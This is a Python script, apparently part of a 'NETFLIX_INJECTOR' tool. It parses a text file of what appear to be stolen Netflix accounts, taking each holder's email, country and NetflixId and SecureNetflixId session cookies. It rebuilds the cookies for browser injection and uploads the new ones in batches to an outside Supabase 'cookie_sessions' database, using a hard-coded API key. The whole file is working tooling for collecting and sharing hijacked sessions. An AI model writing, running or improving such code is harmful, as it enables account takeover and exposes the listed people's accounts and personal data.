import json
import re
import requests
import sys

INPUT_FILE = r"c:\Users\Admin\Downloads\NETFLIX_INJECTOR\NETFLIX_INJECTOR\newcookies.txt"
SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

def get_existing_netflix_ids():
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
    }
    # Fetch all records. Since there are only ~750, we can fetch them all.
    # Supabase default limit is usually 1000.
    response = requests.get(f"{SUPABASE_URL}/rest/v1/cookie_sessions?select=cookies", headers=headers)
    if response.status_code != 200:
        print(f"Error fetching existing cookies: {response.status_code} - {response.text}")
        return set()
    
    existing_ids = set()
    data = response.json()
    for row in data:
        cookies = row.get("cookies")
        if not cookies:
            continue
            
        if isinstance(cookies, str):
            try:
                cookies = json.loads(cookies)
            except:
                continue
                
        if isinstance(cookies, list):
            for c in cookies:
                if c.get("name") == "NetflixId":
                    existing_ids.add(c.get("value"))
    return existing_ids

def parse_line(line):
    line = line.strip()
    if not line: return None
    
    # Email is before the first colon
    email_match = re.match(r'^([^:|]+)', line)
    email = email_match.group(1).strip() if email_match else "Unknown"
    
    # Country
    country_match = re.search(r'Country\s*=\s*([^|]+)', line)
    country = country_match.group(1).strip() if country_match else "Unknown"
    
    # NetflixId from NetflixCookies field
    # Format: NetflixCookies = NetflixIdv%3D3...
    netflix_id_match = re.search(r'NetflixCookies\s*=\s*NetflixId([^|\s]+)', line)
    if not netflix_id_match:
        # Alternative format: NetflixId=...
        netflix_id_match = re.search(r'NetflixId=([^|\s]+)', line)
        
    if not netflix_id_match:
        # Try finding anywhere in line starting with v%3D3
        netflix_id_match = re.search(r'v%3D3%26ct%3D([^|\s]+)', line)
        if netflix_id_match:
            netflix_id = "v%3D3%26ct%3D" + netflix_id_match.group(1)
        else:
            return None
    else:
        netflix_id = netflix_id_match.group(1).strip()
    
    # SecureNetflixId
    secure_id_match = re.search(r'SecureNetflixId\s*=\s*([^|\s]+)', line)
    secure_id = secure_id_match.group(1).strip() if secure_id_match else None
    
    cookies = [
        {
            "name": "NetflixId",
            "value": netflix_id,
            "domain": ".netflix.com",
            "path": "/",
            "secure": True,
            "httpOnly": True,
            "sameSite": "Lax",
            "expirationDate": 2147483647,
            "session": False
        }
    ]
    
    if secure_id:
        cookies.append({
            "name": "SecureNetflixId",
            "value": secure_id,
            "domain": ".netflix.com",
            "path": "/",
            "secure": True,
            "httpOnly": True,
            "sameSite": "Lax",
            "expirationDate": 2147483647,
            "session": False
        })
        
    return {
        "netflix_id": netflix_id,
        "email": email,
        "country": country,
        "cookies": cookies
    }

def main():
    print("Fetching existing NetflixIds from database...")
    existing_ids = get_existing_netflix_ids()
    print(f"Found {len(existing_ids)} existing sessions in database.")
    
    new_sessions = []
    seen_in_file = set()
    
    print(f"Reading {INPUT_FILE}...")
    try:
        with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parsed = parse_line(line)
                if parsed:
                    nid = parsed["netflix_id"]
                    if nid in seen_in_file:
                        continue
                    seen_in_file.add(nid)
                    
                    if nid not in existing_ids:
                        new_sessions.append({
                            "cookies": parsed["cookies"],
                            "description": f"{parsed['email']} | {parsed['country']}"
                        })
    except Exception as e:
        print(f"Error reading file: {e}")
        return
                    
    if not new_sessions:
        print("No new unique cookies to insert.")
        return
        
    print(f"Found {len(new_sessions)} new unique sessions. Inserting in batches...")
    
    batch_size = 50
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    
    success_count = 0
    for i in range(0, len(new_sessions), batch_size):
        batch = new_sessions[i:i+batch_size]
        resp = requests.post(f"{SUPABASE_URL}/rest/v1/cookie_sessions", json=batch, headers=headers)
        if resp.status_code in [200, 201]:
            success_count += len(batch)
            print(f"Inserted batch {i//batch_size + 1}/{(len(new_sessions)-1)//batch_size + 1}")
        else:
            print(f"Error inserting batch: {resp.status_code} - {resp.text}")
            
    print(f"Successfully inserted {success_count} sessions.")

if __name__ == "__main__":
    main()
